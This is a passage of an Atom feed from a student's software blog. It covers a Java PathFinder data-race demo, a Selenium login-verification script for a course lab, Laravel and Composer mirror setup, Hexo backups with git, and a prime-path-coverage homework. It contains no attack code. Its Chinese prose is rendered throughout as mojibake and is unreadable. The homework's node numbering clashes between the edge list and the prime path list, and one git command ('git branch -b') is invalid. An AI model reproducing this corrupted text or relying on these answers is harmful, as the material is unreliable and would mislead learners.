http://babelfish.arc.nasa.gov/hg/jpf/jpf-core$ cd jpf-core$ ant test</code></pre><p>æˆåŠŸåä¼šæç¤ºå®‰è£…æˆåŠŸ</p><pre><code>BUILD SUCCESSFULTotal time: 3 minutes 53 seconds</code></pre><p>æ–°å»ºä¸€ä¸ªJAVAç±»ï¼Œæµ‹è¯•jpf</p><pre><code class="java"># Racer.javapublic class Racer implements Runnable {    int d = 42;    public void run () {        doSomething(1000);                   // (1)        d = 0;                               // (2)    }    public static void main (String[] args){        Racer racer = new Racer();        Thread t = new Thread(racer);        t.start();        doSomething(1000);                   // (3)        int c = 420 / racer.d;               // (4)        System.out.println(c);    }    static void doSomething (int n) {        // not very interesting..        try { Thread.sleep(n); } catch (InterruptedException ix) {}    }}</code></pre><p>åœ¨åŒä¸€ç›®å½•ä¸‹å»ºç«‹Racer.jpfï¼Œå†™å…¥jpfçš„é…ç½®ä¿¡æ¯</p><pre><code># Racer.jpftarget = Racerlistener=gov.nasa.jpf.listener.PreciseRaceDetectorreport.console.property_violation=error,traceâ€‹</code></pre><p>ä¸Šè¿°é…ç½®èƒ½å¤Ÿè¾“å‡ºjpfçš„å·¥ä½œæ ˆ<br>æ­¤ç¨‹åºæ­£å¸¸çš„è¾“å‡ºåº”ä¸º10<br>ç„¶è€Œç”±äºæˆ‘ä»¬ä¸çŸ¥é“çº¿ç¨‹çš„è°ƒåº¦å…³ç³»ï¼Œå› è€Œå¿½ç•¥äº†å¯èƒ½å¯¼è‡´çš„é™¤0çš„é—®é¢˜</p><pre><code>$ ~/jpf-core/bin/jpf Racer.jpf# outputJavaPathfinder core system v8.0 (rev 32) - (C) 2005-2014 United States Government. All rights reserved.====================================================== system under testRacer.main()====================================================== search started: 17-4-10 ä¸‹åˆ4:211010====================================================== error 1gov.nasa.jpf.listener.PreciseRaceDetectorrace for field Racer@15b.d  main at Racer.main(Racer.java:35)        &quot;int c = 420 / racer.d;               // (4)&quot;  READ:  getfield Racer.d  Thread-1 at Racer.run(Racer.java:26)        &quot;d = 0;                               // (2)&quot;  WRITE: putfield Racer.d====================================================== trace #1------------------------------------------------------ transition #0 thread: 0gov.nasa.jpf.vm.choice.ThreadChoiceFromSet {id:&quot;ROOT&quot; ,1/1,isCascaded:false}      [3157 insn w/o sources]  Racer.java:30                  : Racer racer = new Racer();  Racer.java:19                  : public class Racer implements Runnable {      [1 insn w/o sources]  Racer.java:21                  : int d = 42;  Racer.java:30                  : Racer racer = new Racer();  Racer.java:31                  : Thread t = new Thread(racer);      [145 insn w/o sources]  Racer.java:31                  : Thread t = new Thread(racer);  Racer.java:32                  : t.start();      [1 insn w/o sources]------------------------------------------------------ transition #1 thread: 0gov.nasa.jpf.vm.choice.ThreadChoiceFromSet {id:&quot;START&quot; ,1/2,isCascaded:false}      [2 insn w/o sources]  Racer.java:34                  : doSomething(1000);                   // (3)  Racer.java:41                  : try { Thread.sleep(n); } catch (InterruptedException ix) {}      [4 insn w/o sources]------------------------------------------------------ transition #2 thread: 1gov.nasa.jpf.vm.choice.ThreadChoiceFromSet {id:&quot;SLEEP&quot; ,2/2,isCascaded:false}      [1 insn w/o sources]  Racer.java:1                   : /*  Racer.java:25                  : doSomething(1001);                   // (1)  Racer.java:41                  : try { Thread.sleep(n); } catch (InterruptedException ix) {}      [4 insn w/o sources]------------------------------------------------------ transition #3 thread: 1gov.nasa.jpf.vm.choice.ThreadChoiceFromSet {id:&quot;SLEEP&quot; ,2/2,isCascaded:false}      [3 insn w/o sources]  Racer.java:41                  : try { Thread.sleep(n); } catch (InterruptedException ix) {}  Racer.java:42                  : }  Racer.java:26                  : d = 0;                               // (2)------------------------------------------------------ transition #4 thread: 0gov.nasa.jpf.vm.choice.ThreadChoiceFromSet {id:&quot;SHARED_OBJECT&quot; ,1/2,isCascaded:false}      [3 insn w/o sources]  Racer.java:41                  : try { Thread.sleep(n); } catch (InterruptedException ix) {}  Racer.java:42                  : }  Racer.java:35                  : int c = 420 / racer.d;               // (4)------------------------------------------------------ transition #5 thread: 0gov.nasa.jpf.vm.choice.ThreadChoiceFromSet {id:&quot;SHARED_OBJECT&quot; ,1/2,isCascaded:false}  Racer.java:35                  : int c = 420 / racer.d;               // (4)====================================================== resultserror #1: gov.nasa.jpf.listener.PreciseRaceDetector &quot;race for field Racer@15b.d   main at Racer.main(Ra...&quot;====================================================== statisticselapsed time:       00:00:00states:             new=9,visited=1,backtracked=4,end=2search:             maxDepth=6,constraints=0choice generators:  thread=8 (signal=0,lock=1,sharedRef=2,threadApi=3,reschedule=2), data=0heap:               new=362,released=33,maxLive=357,gcCycles=7instructions:       3424max memory:         119MBloaded code:        classes=62,methods=1477====================================================== search finished: 17-4-10 ä¸‹åˆ4:21</code></pre><p>å¯ä»¥çœ‹åˆ°jpfå¸®æˆ‘ä»¬è¿è¡Œäº†æ‰€æœ‰å¯èƒ½çš„è·¯å¾„ï¼ŒåŒæ—¶æ‰¾åˆ°äº†å¯èƒ½å‘ç”Ÿçš„é”™è¯¯<br>é€šè¿‡çº¿ç¨‹çš„è§’åº¦æ¥è€ƒè™‘ï¼Œå¯ä»¥ç”¨å®˜ç½‘ç»™å‡ºçš„è¿™ä¸ªè°ƒåº¦å›¾æ¥è¯´æ˜ï¼š<br><img src="/images/interleavings.png" alt="pictures"><br>å¯¹äºä¸€ä¸ªå¤šçº¿ç¨‹çš„javaç¨‹åºï¼Œjpfä¼šç»„åˆå‡ºæ‰€æœ‰çš„å¯èƒ½çš„çº¿ç¨‹è°ƒåº¦ï¼Œå¹¶é¡ºåºéå†æ¯ä¸€ç§æ‰§è¡Œé¡ºåºï¼ŒçŸ¥é“æ‰¾åˆ°å¯èƒ½å­˜åœ¨çš„ç¼ºé™·</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;è½¯ä»¶æµ‹è¯•å°ç»„ä½œä¸šä¹‹JPF&lt;/p&gt;
&lt;p&gt;é¦–å…ˆå…ˆè¯´è¯´JPFæ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿&lt;/p&gt;
&lt;p&gt;å®˜æ–¹ç»™å‡ºçš„è§£é‡Šï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;JPFæ ¸å¿ƒæ˜¯ç”¨äºJavaâ„¢å­—èŠ‚ç çš„è™šæ‹Ÿæœºï¼ˆVMï¼‰ï¼Œè¿™æ„å‘³ç€å®ƒæ˜¯ä¸€ä¸ªç¨‹åºï¼Œæ‚¨å¯ä»¥è®©Javaç¨‹åºæ‰§è¡Œã€‚å®ƒç”¨äºåœ¨è¿™äº›ç¨‹åºä¸­æ‰¾åˆ°ç¼ºé™·ï¼Œå› æ­¤æ‚¨
      
    
    </summary>
    
      <category term="ä½œä¸š" scheme="https://blog.liebes.top/categories/%E4%BD%9C%E4%B8%9A/"/>
    
    
      <category term="è½¯ä»¶æµ‹è¯•ä½œä¸š" scheme="https://blog.liebes.top/tags/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/"/>
    
  </entry>
  
  <entry>
    <title>ã€è½¯ä»¶æµ‹è¯•ã€‘Selenium Web æµ‹è¯•</title>
    <link href="https://blog.liebes.top/2017/03/26/SoftwareTest-LIB-2/"/>
    <id>https://blog.liebes.top/2017/03/26/SoftwareTest-LIB-2/</id>
    <published>2017-03-26T17:08:07.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>Selenium ç”¨äºWEBç¨‹åºæµ‹è¯•ï¼Œå¯ä»¥å½•åˆ¶ä¸‹æ¥ç‚¹å‡»è¿‡ç¨‹çš„è„šæœ¬ï¼Œå¹¶è‡ªåŠ¨è¿›è¡Œæµ‹è¯•ã€‚</p><ul><li><a href="#ide">ä½¿ç”¨selenium-ide è¿›è¡Œè„šæœ¬å½•åˆ¶</a></li><li><a href="#selenium-java">ä½¿ç”¨javaç¼–å†™seleniumç¨‹åºï¼Œå®ç°è‡ªåŠ¨éªŒè¯</a></li></ul><hr><p></p><h2 id="ide">ä½¿ç”¨selenium-ide è¿›è¡Œè„šæœ¬å½•åˆ¶</h2><br>åœ¨å¼€å§‹å®éªŒä¹‹å‰ï¼Œéœ€è¦å®‰è£…æ‰€éœ€è¦çš„è½¯ä»¶ã€‚é¦–å…ˆæƒ³è¦ä½¿ç”¨selenium-ideï¼Œéœ€è¦æ˜¯ç”¨firefoxæµè§ˆå™¨ã€‚<br><a href="https://www.mozilla.org/zh-CN/firefox/new/" target="_blank" rel="noopener">firefoxä¸‹è½½é“¾æ¥</a><br><a href="https://addons.mozilla.org/en-US/firefox/addon/selenium-ide/" target="_blank" rel="noopener">selenium-ideä¸‹è½½é“¾æ¥</a><br>å°†ä¸‹è½½åçš„seleniumæ’ä»¶æ‹–åˆ°firefoxé‡Œå³å¯è‡ªåŠ¨å®‰è£…ã€‚<br>æˆåŠŸå®‰è£…åï¼Œåœ¨firefoxä¸­å¯ä»¥æ‰“å¼€seleniumæ’ä»¶:<br>é€‰æ‹©å¼€å‘è€…å·¥å…·ä¸­çš„selenium-ide<br><img src="/images/2017-3-26-21-22.png" alt="Pictures"><br>æ‰“å¼€åé•¿è¿™ä¸ªæ ·å­<br><img src="/images/2017-3-26-21-27.png" alt="Pictures"><br>åœ¨1çš„ä½ç½®è¾“å…¥æƒ³è¦æµ‹è¯•çš„ç½‘å€ï¼Œæ¥ç€ç‚¹å‡»2ä½ç½®çš„æŒ‰é’®å¼€å§‹å½•åˆ¶ã€‚å»æµè§ˆå™¨è®¿é—®å¯¹åº”çš„ç½‘ç«™ï¼Œå®Œæˆè¡¨å•æäº¤æ“ä½œï¼Œå›åˆ°selenium-ideä¼šçœ‹åˆ°å½•åˆ¶ä¸‹æ¥çš„caseï¼Œæœ€åç‚¹å‡»4,ä¼šå°†å½“å‰æ‰€æœ‰çš„caseæ‰§è¡Œä¸€éã€‚<p></p><hr><p></p><h2 id="selenium-java">ä½¿ç”¨javaç¼–å†™seleniumç¨‹åºï¼Œå®ç°è‡ªåŠ¨éªŒè¯</h2><br>æ–°å»ºä¸€ä¸ªjavaé¡¹ç›®ï¼Œç„¶åå¯¼å…¥ä¸‹åˆ—jaråŒ…<p></p><ul><li><a href="http://selenium-release.storage.googleapis.com/3.3/selenium-server-standalone-3.3.1.jar" target="_blank" rel="noopener">selenium-server-standalone-3.3.1.jar</a></li><li><a href="http://selenium-release.storage.googleapis.com/3.3/selenium-java-3.3.1.zip" target="_blank" rel="noopener">selenium-java-3.3.1.zip</a></li></ul><p>å¯¼å…¥æˆåŠŸåéœ€è¦ä¸‹è½½firefoxçš„é©±åŠ¨ï¼š<br><a href="https://github.com/mozilla/geckodriver/releases/download/v0.15.0/geckodriver-v0.15.0-linux64.tar.gz" target="_blank" rel="noopener">geckodriver-v0.15.0-linux64.tar.gz</a></p><p>ä»¥ä¸Šå°±æ˜¯å…¨éƒ¨çš„å‡†å¤‡å·¥ä½œäº†<br>æ–°å»ºä¸€ä¸ªé¡¹ç›®ï¼Œåœ¨mainæ–¹æ³•ä¸­å†™å¦‚ä¸‹ä»£ç :</p><pre><code class="java">import java.io.*;import java.util.concurrent.TimeUnit;import org.openqa.selenium.*;import org.openqa.selenium.firefox.FirefoxDriver;import com.csvreader.*;public class Main {    public static void main(String[] args){        //å®šä¹‰æµ‹è¯•çš„æ ¹ç›®å½•        String baseUrl = &quot;http://121.193.130.195:8080&quot;;        // åˆ›å»ºwebdriverå¯¹è±¡        System.setProperty(&quot;webdriver.gecko.driver&quot;, &quot;geckodriver&quot;);        WebDriver driver = new FirefoxDriver();        driver.manage().timeouts().implicitlyWait(30, TimeUnit.SECONDS);        try{            //è¯»å–csvæ–‡ä»¶            File inFile = new File(&quot;inputgit.csv&quot;);            BufferedReader reader = new BufferedReader(new FileReader(inFile));            CsvReader csvreader = new CsvReader(reader,&#39;,&#39;);            //æ¯æ¬¡è¯»å–ä¸€è¡Œ            while(csvreader.readRecord()){                String str = csvreader.getRawRecord();                String[] strList = str.split(&quot;,&quot;);                //ä½¿ç”¨webdriveræ¨¡æ‹Ÿç™»å½•ï¼Œå¹¶è·å–ä¿¡æ¯                driver.get(baseUrl + &quot;/&quot;);                driver.findElement(By.id(&quot;name&quot;)).clear();                driver.findElement(By.id(&quot;name&quot;)).sendKeys(strList[0]);                driver.findElement(By.id(&quot;pwd&quot;)).clear();                driver.findElement(By.id(&quot;pwd&quot;)).sendKeys(strList[0].substring(4));                driver.findElement(By.id(&quot;submit&quot;)).click();                String temp = strList[0];                strList[0] = strList[1];                strList[1] = temp;                //è·å–ç‰¹å®šéªŒè¯ä¿¡æ¯                String[] targetGitUrl = driver.findElement(By.id(&quot;resultString&quot;)).getAttribute(&quot;innerHTML&quot;).trim().split(&quot;,&quot;);                boolean flag = true;                for(int i = 0; i &lt; 3; i ++){                    if(!strList[i].equals(targetGitUrl[i])){                        flag = false;                        break;                    }                }                //éªŒè¯å¤±è´¥                if(!flag){                    System.out.println(&quot;Error: \n&quot; + strList[0] + &quot; &quot; + strList[1] + &quot; &quot; + strList[2]);                    System.out.println(targetGitUrl[0] + &quot; &quot; + targetGitUrl[1] + &quot; &quot; + targetGitUrl[2]);                }            }            driver.quit();        } catch (IOException e){            e.printStackTrace();        }    }}</code></pre><p>è¿è¡Œå³å¯<br>å®Œæ•´çš„é¡¹ç›®åœ¨githubä¸Šï¼š<a href="https://github.com/wanghaichi/selenium-web-test" target="_blank" rel="noopener">selenium-web-test</a></p><hr><p>æŒ½å°Š</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Selenium ç”¨äºWEBç¨‹åºæµ‹è¯•ï¼Œå¯ä»¥å½•åˆ¶ä¸‹æ¥ç‚¹å‡»è¿‡ç¨‹çš„è„šæœ¬ï¼Œå¹¶è‡ªåŠ¨è¿›è¡Œæµ‹è¯•ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#ide&quot;&gt;ä½¿ç”¨selenium-ide è¿›è¡Œè„šæœ¬å½•åˆ¶&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#selenium-java&quot;&gt;ä½¿ç”¨javaç¼–
      
    
    </summary>
    
      <category term="ä¸Šæœºå®éªŒ" scheme="https://blog.liebes.top/categories/%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
    
      <category term="è½¯ä»¶æµ‹è¯•ä¸Šæœºå®éªŒ" scheme="https://blog.liebes.top/tags/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>laravelçš„å­¦ä¹ æ—¥å¸¸-åˆè¯†</title>
    <link href="https://blog.liebes.top/2017/03/20/laravel-learn-1/"/>
    <id>https://blog.liebes.top/2017/03/20/laravel-learn-1/</id>
    <published>2017-03-20T00:24:17.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>è®°å½•è®°å½•è‡ªå·±è¸©è¿‡çš„å‘</p><hr><p>æŒ‰ç…§å®˜æ–¹æ–‡æ¡£ï¼Œä¹–ä¹–çš„ç”¨composerè¿›è¡Œå®‰è£…ï¼š</p><pre><code>$ composer global require &quot;laravel/installer&quot;</code></pre><p>ç„¶åï¼Œå°±ç»™æˆ‘æŠ¥äº†å™¼é‡Œå•ªå•¦ä¸€å †é”™è¯¯</p><pre><code>  [Composer\Downloader\TransportException]                                       The &quot;https://packagist.org/packages.json&quot; file could not be downloaded: fai    led to open stream: Connection timed out                                     </code></pre><p>EXMï¼Ÿæˆ‘è¿˜å•¥ä¹Ÿæ²¡å¹²å‘¢å•Š = =ã€‚<br>ç„¶åå§ï¼Œæˆ‘å°±æŠŠè¿™ä¸ªé”™è¯¯æ‰”åˆ°äº†googleä¸Šï¼Œæ³¨æ„äº†æ³¨æ„äº†ï¼Œåˆ’é‡ç‚¹äº†ï¼æœå‡ºæ¥è§£å†³æ–¹æ¡ˆçš„æ²¡æœ‰ä¸€ä¸ªå¯ä»¥ç”¨çš„ï¼ç„¶åæˆ‘å‘ç°åªæ˜¯å•çº¯çš„è¢«å¢™äº†è€Œå·²ã€‚<br>WHAT THE FUCK !!!<br>è§£å†³åŠæ³•ä¹ŸæŒºç®€å•ï¼ŒæŠŠcomposerçš„æºåˆ‡æˆå›½å†…é•œåƒå°±å¥½äº†</p><pre><code>$ composer config -g repo.packagist composer https://packagist.phpcomposer.com</code></pre><p>å…·ä½“çš„å¯ä»¥å‚è§ <a href="https://pkg.phpcomposer.com/" target="_blank" rel="noopener">Packagist / Composer ä¸­å›½å…¨é‡é•œåƒ</a> è¿™é‡Œã€‚<br>æ¥ä¸‹æ¥å°±å¯ä»¥æ„‰å¿«çš„ä½¿ç”¨laraveläº†</p><pre><code>$ composer global require &quot;laravel/installer&quot;</code></pre><p>ä½¿ç”¨laravelæ–°å»ºä¸€ä¸ªé¡¹ç›®ï¼Œç„¶åå°±å¯ä»¥çœ‹åˆ°ç‰›é€¼é—ªé—ªçš„lavavelçš„ç›®å½•ç»“æ„ï¼š</p><pre><code>$ laravel new myProject</code></pre><p><img src="/images/2017-3-20-15-16.png" alt="pictures"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;è®°å½•è®°å½•è‡ªå·±è¸©è¿‡çš„å‘&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;æŒ‰ç…§å®˜æ–¹æ–‡æ¡£ï¼Œä¹–ä¹–çš„ç”¨composerè¿›è¡Œå®‰è£…ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ composer global require &amp;quot;laravel/installer&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç„¶å
      
    
    </summary>
    
      <category term="ä¸ªäººæ—¥è®°" scheme="https://blog.liebes.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="laravel" scheme="https://blog.liebes.top/tags/laravel/"/>
    
  </entry>
  
  <entry>
    <title>hexo ä½¿ç”¨gitå¤‡ä»½hexoæºæ–‡ä»¶</title>
    <link href="https://blog.liebes.top/2017/03/17/hexo-backup/"/>
    <id>https://blog.liebes.top/2017/03/17/hexo-backup/</id>
    <published>2017-03-17T15:29:17.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™æ˜¯ä¸ªæ‚²ä¼¤çš„æ•…äº‹ï¼Œæµ·ç—´çš„linuxå‡ºäº†ç‚¹æ¯›ç—…ï¼Œç„¶åå°±æƒ³ç€é‡è£…ä¸€éã€‚ææŒ‡ä¸€ç®—ï¼Œè‡ªå®¶çš„ä»£ç åœ¨gitä¸Šé¢éƒ½ä¿å­˜äº†ï¼Œç›´æ¥é‡è£…ï¼<br>ç„¶åå§ï¼Œhexoä½ å¤§çˆ·ï¼Œä½ æ²¡äº‹å°±ä¸èƒ½æŠŠåšå®¢åŸæ–‡å¤‡ä»½ä¸€ä¸‹ä¹ˆï¼Ÿåˆä¸å ä½ çš„ç©ºé—´ï¼é‚£ä¹ˆè´¹åŠ²ä¹ˆï¼<br>æ˜¯çš„ï¼Œæµ·ç—´çš„åšå®¢éƒ½æ²¡äº†ï¼Œåˆ«é—®æˆ‘ä¸ºä»€ä¹ˆè¿˜èƒ½çœ‹ç€ï¼Œå®å®å¤åˆ¶ç²˜è´´éƒ½å¿«åäº†ï¼Œå¼„åˆ°å‡Œæ™¨ä¸¤ç‚¹å¤šæ‰æ¢å¤äº†ã€‚<br>è¿™ä»¶äº‹æƒ…å‘Šè¯‰æˆ‘ä»¬ï¼Œæ²¡äº‹é—²çš„åˆ«é‡è£…ç³»ç»Ÿã€‚</p><hr><p>å…·ä½“çš„æ€è·¯å°±æ˜¯åœ¨æˆ‘ä»¬çš„åšå®¢ä»“åº“ä¸­æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œç”¨æ¥ä¿å­˜æºç ï¼Œmasteråˆ†æ”¯ç”¨æ¥æäº¤hexoè‡ªåŠ¨ç”Ÿæˆçš„æ–‡ä»¶ã€‚ä»¥æµ·ç—´çš„åšå®¢ä¸ºä¾‹ã€‚æ‰“å¼€wanghaichi.github.ioå·¥ä½œç›®å½•ï¼Œæˆ‘ä»¬å¯ä»¥å–œé—»ä¹è§çš„å‘ç°æ²¡æœ‰.gitæ–‡ä»¶å¤¹ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥çš„äº‹æƒ…å°±ç®€å•äº†<br>æ‰“å¼€å·¥ä½œç›®å½•ï¼Œæ‰§è¡Œä»¥ä¸‹æ“ä½œ</p><pre><code>$ git init$ vi .gitignore.DS_StoreThumbs.dbdb.json  *.log.deploy*/node_modules/.npmignorepublic/$ git branch -b hexo$ git add .$ git commit -m &quot;backup&quot;$ git remote add origin git@github.com:wanghaichi/wanghaichi.github.io.git$ git push origin hexo</code></pre><p>å¦‚æœæ²¡è®¾ç½®sshæƒé™å¯èƒ½éœ€è¦è®¾ç½®ä¸€ä¸‹ï¼Œç„¶åå»githubä»“åº“é‡Œé¢åˆ‡æ¢ä»¥ä¸‹åˆ†æ”¯ï¼Œä½ çš„å¯çˆ±çš„åšå®¢å°±éƒ½åœ¨é‡Œé¢å•¦ã€‚<br>ä»¥åæ¯æ¬¡å†™å®Œåšå®¢ï¼Œå…ˆæ‰§è¡Œä¸€é</p><pre><code>$ git add .$ git commit -m &quot;backup&quot;$ git push origin hexo</code></pre><p>å†å‘å¸ƒï¼Œå°±ä¸ç”¨æ‹…å¿ƒè‡ªå®¶åšå®¢ä¸¢å¤±å•¦</p><hr><p>å¦ˆå¦ˆå†ä¹Ÿä¸ç”¨æ‹…å¿ƒå¤åˆ¶åšå®¢åˆ°é›¶ç‚¹å•¦</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;è¿™æ˜¯ä¸ªæ‚²ä¼¤çš„æ•…äº‹ï¼Œæµ·ç—´çš„linuxå‡ºäº†ç‚¹æ¯›ç—…ï¼Œç„¶åå°±æƒ³ç€é‡è£…ä¸€éã€‚ææŒ‡ä¸€ç®—ï¼Œè‡ªå®¶çš„ä»£ç åœ¨gitä¸Šé¢éƒ½ä¿å­˜äº†ï¼Œç›´æ¥é‡è£…ï¼&lt;br&gt;ç„¶åå§ï¼Œhexoä½ å¤§çˆ·ï¼Œä½ æ²¡äº‹å°±ä¸èƒ½æŠŠåšå®¢åŸæ–‡å¤‡ä»½ä¸€ä¸‹ä¹ˆï¼Ÿåˆä¸å ä½ çš„ç©ºé—´ï¼é‚£ä¹ˆè´¹åŠ²ä¹ˆï¼&lt;br&gt;æ˜¯çš„ï¼Œæµ·ç—´çš„åšå®¢éƒ½æ²¡äº†ï¼Œåˆ«é—®æˆ‘ä¸ºä»€ä¹ˆè¿˜èƒ½çœ‹ç€ï¼Œå®å®å¤åˆ¶
      
    
    </summary>
    
      <category term="ä¸ªäººæ—¥è®°" scheme="https://blog.liebes.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="hexo" scheme="https://blog.liebes.top/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>ã€è½¯ä»¶æµ‹è¯•ã€‘ä½œä¸š3 æµ‹è¯•ä¹‹è·¯å¾„è¦†ç›–</title>
    <link href="https://blog.liebes.top/2017/03/15/SoftwareTest-HW-3/"/>
    <id>https://blog.liebes.top/2017/03/15/SoftwareTest-HW-3/</id>
    <published>2017-03-15T23:34:02.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹¦ä¸Šçš„ç»ƒä¹ é¢˜ï¼Œè¦æ±‚è®¾è®¡ç›¸åº”çš„æµ‹è¯•ç”¨ä¾‹ï¼Œå†™å‡ºä¸»è·¯å¾„è¦†ç›–</p><ul><li><a href="#problem">Problem Description</a></li><li><a href="#answer">Answer</a><!--mo--></li></ul><hr><p></p><h2 id="problem">Problem Description</h2><p></p><pre><code>/*********************************** * Finds and prints n prime integers * Jeff Offutt, Spring 2003************************************/private static void printPrimes (int n){    int curPrime;        // Value currently considered for primeness    int numPrimes;        // Number of primes found so far.    boolean isPrime;    // Is curPrime prime?    int [] primes = new int [MAXPRIMES]; // The list of prime numbers.    // Initialize 2 into the list of primes.    primes[0] = 2;    numPrimes = 1;    curPrime = 2;    while(numPrimes &lt; n){        curPrime++;        //next number to consider ...        isPrime = true;        for(int i = 0; i &lt;= numPrime-1; i++){            if(isDivisible(primes[i], curPrime)){                isPrime = false;                break;            }        }        if(isPrime){            primes[numPrimes] = curPrime;            numPrimes++;        }    } // end while    //Print all the primes out.    for(int i = 0; i &lt;= numPrimes-1; i ++){        System.out.println(&quot;Prime: &quot;+ primes[i]);    }} // end printPrimes</code></pre><blockquote><p>a) Draw the control flow graph for the printPrimes() method.</p></blockquote><blockquote><p>b) Consider test cases t1 = (n = 3) and t2 = (n = 5). Although these tour the prime paths in printPrimes(), they do not necessarily find the same faults. Design a simple fault that t2 would be more likely to discover than t1 would.</p></blockquote><blockquote><p>c) For printPrimes(), find a test case such that the corresponding test path visits the edge that connects the beginning of the while statement to the for statement without going through the body of the while loop.</p></blockquote><blockquote><p>d) Enumerate the test requirements for node coverage, edge coverage, and prime path coverage for the graph for printPrimes().</p></blockquote><hr><p></p><h2 id="answer">Answer</h2><p></p><h5 id="a-Draw-the-control-flow-graph-for-the-printPrimes-method"><a href="#a-Draw-the-control-flow-graph-for-the-printPrimes-method" class="headerlink" title="a) Draw the control flow graph for the printPrimes() method."></a>a) Draw the control flow graph for the printPrimes() method.</h5><p><img src="/images/2017-3-14-23-28.png" alt="pictures"></p><h5 id="b-Consider-test-cases-t1-n-3-and-t2-n-5-Although-these-tour-the-prime-paths-in-printPrimes-they-do-not-necessarily-find-the-same-faults-Design-a-simple-fault-that-t2-would-be-more-likely-to-discover-than-t1-would"><a href="#b-Consider-test-cases-t1-n-3-and-t2-n-5-Although-these-tour-the-prime-paths-in-printPrimes-they-do-not-necessarily-find-the-same-faults-Design-a-simple-fault-that-t2-would-be-more-likely-to-discover-than-t1-would" class="headerlink" title="b) Consider test cases t1 = (n = 3) and t2 = (n = 5). Although these tour the prime paths in printPrimes(), they do not necessarily find the same faults. Design a simple fault that t2 would be more likely to discover than t1 would."></a>b) Consider test cases t1 = (n = 3) and t2 = (n = 5). Although these tour the prime paths in printPrimes(), they do not necessarily find the same faults. Design a simple fault that t2 would be more likely to discover than t1 would.</h5><blockquote><p>If constant variable <code>MAXPRIMES</code> equals 4,it will occur a fault when n equals 5 but will not if n equals 3.</p></blockquote><h5 id="c-For-printPrimes-find-a-test-case-such-that-the-corresponding-test-path-visits-the-edge-that-connects-the-beginning-of-the-while-statement-to-the-for-statement-without-going-through-the-body-of-the-while-loop"><a href="#c-For-printPrimes-find-a-test-case-such-that-the-corresponding-test-path-visits-the-edge-that-connects-the-beginning-of-the-while-statement-to-the-for-statement-without-going-through-the-body-of-the-while-loop" class="headerlink" title="c) For printPrimes(), find a test case such that the corresponding test path visits the edge that connects the beginning of the while statement to the for statement without going through the body of the while loop."></a>c) For printPrimes(), find a test case such that the corresponding test path visits the edge that connects the beginning of the while statement to the for statement without going through the body of the while loop.</h5><blockquote><p>Let n = 1, and it will break the while loop in the first iteration.</p></blockquote><h5 id="d-Enumerate-the-test-requirements-for-node-coverage-edge-coverage-and-prime-path-coverage-for-the-graph-for-printPrimes"><a href="#d-Enumerate-the-test-requirements-for-node-coverage-edge-coverage-and-prime-path-coverage-for-the-graph-for-printPrimes" class="headerlink" title="d) Enumerate the test requirements for node coverage, edge coverage, and prime path coverage for the graph for printPrimes()."></a>d) Enumerate the test requirements for node coverage, edge coverage, and prime path coverage for the graph for printPrimes().</h5><p>node coverage</p><blockquote><p>{1,2,3,4,5,6,7,8,9,10,11,12,13,14}</p></blockquote><p>edge coverage</p><blockquote><p>{(1,2), (2,3), (2,10), (3,4), (4,5), (5,6), (5,8), (6,5), (6,7), (7,8), (8,2), (9,2), (10,11), (11,12), (11,14), (12,13), (13,11)}</p></blockquote><p>prime path coverage</p><blockquote><p>{(1,2,3,4,5,6,7),<br>(1,2,3,4,5,6,8,9,10,11),<br>(1,2,3,4,5,6,8,9,11),<br>(1,2,3,4,5,9,10,11),<br>(1,2,3,4,5,9,11),<br>(1,2,12,13,14,15),<br>(1,2,12,16),<br>(2,3,4,5,6,8,9,10,11,2),<br>(2,3,4,5,6,8,9,11,2),<br>(2,3,4,5,9,10,11,2),<br>(2,3,4,5,9,11,2),<br>(3,4,5,6,8,9,10,11,2,12,13,14,15),<br>(3,4,5,6,8,9,11,2,12,13,14,15),<br>(3,4,5,6,8,9,10,11,2,12,13,16),<br>(3,4,5,6,8,9,11,2,12,13,16),<br>(3,4,5,9,10,11,2,12,13,14,15),<br>(3,4,5,9,11,2,12,13,14,15),<br>(3,4,5,9,10,11,2,12,13,16),<br>(3,4,5,9,11,2,12,13,16),<br>(5,6,7,5),<br>(6,7,5,9,10,11,2,12,13,14,15),<br>(6,7,5,9,11,2,12,13,14,15),<br>(6,7,5,9,10,11,2,12,13,16),<br>(6,7,5,9,11,2,12,13,16),<br>(13,14,15,13),<br>(14,15,13,16)}</p></blockquote><h5 id="e-Design-a-test-case-to-coverage-prime-path-using-JUnit"><a href="#e-Design-a-test-case-to-coverage-prime-path-using-JUnit" class="headerlink" title="e) Design a test case to coverage prime path using JUnit."></a>e) Design a test case to coverage prime path using JUnit.</h5><p>Main.java</p><pre><code>public class Main {    private static final int MAXPRIMES = 5;    public static void main(String args[]){        printPrimes(5);    }    private static boolean isDivisible(int a, int 